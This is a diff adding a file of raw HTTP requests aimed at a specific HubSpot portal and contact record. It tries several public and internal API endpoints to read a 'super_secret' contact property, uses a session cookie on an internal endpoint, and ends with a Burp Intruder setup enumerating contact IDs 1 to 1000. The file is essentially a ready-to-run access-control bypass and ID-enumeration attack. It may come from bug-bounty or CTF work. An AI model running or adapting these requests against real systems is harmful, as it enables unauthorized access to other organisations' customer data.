@@ -1,0 +1,62 @@
+# ========================================
+# DIRECT CONTACT ACCESS - API VERSIONS
+# Target: Portal 46962361, Contact ID: 1
+# ========================================
+
+# REQUEST 1: CRM v3 Direct Access
+GET /crm/v3/objects/contacts/1?portalId=46962361&properties=firstname,super_secret,email HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 2: CRM v3 with archived contacts
+GET /crm/v3/objects/contacts/1?portalId=46962361&properties=firstname,super_secret,email&archived=true HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 3: Contacts v1 VID Profile
+GET /contacts/v1/contact/vid/1/profile?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 4: Contacts v2
+GET /contacts/v2/contacts/1?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 5: Inbounddb-objects (Internal API)
+GET /api/inbounddb-objects/v1/crm-objects/0-1/1?portalId=46962361&includeAllValues=true HTTP/2
+Host: app.hubspot.com
+Cookie: YOUR_SESSION_COOKIES_HERE
+Content-Type: application/json
+
+
+# REQUEST 6: CRM Objects v1
+GET /crm-objects/v1/objects/contacts/1?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 7: Contact by Email (if we knew it)
+GET /contacts/v1/contact/email/CONTACT_EMAIL/profile?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 8: Try different contact IDs (1-100)
+# Use Burp Intruder with payload positions:
+GET /crm/v3/objects/contacts/§1§?portalId=46962361&properties=firstname,super_secret,email HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+# Intruder payload: Numbers from 1 to 1000
